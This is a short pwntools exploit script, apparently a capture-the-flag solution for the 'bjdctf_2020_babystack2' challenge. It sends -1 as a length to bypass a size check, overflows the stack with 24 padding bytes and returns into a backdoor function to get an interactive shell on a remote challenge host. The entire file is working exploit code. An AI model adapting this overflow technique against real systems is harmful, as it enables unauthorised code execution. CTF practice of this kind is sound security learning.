from pwn import *

context(os="linux", arch="amd64", log_level="debug")

io = remote("node4.buuoj.cn",29803)
# io = remote("192.168.95.131",10001)
elf = ELF("./bjdctf_2020_babystack2")

backdoor_addr = elf.symbols["backdoor"]
main_addr = elf.symbols["main"]

io.recvuntil(b"input the length of your name:")

io.sendline(b"-1")

payload = flat(b"A"*24, 0x400726, main_addr)

io.sendline(payload)

io.interactive()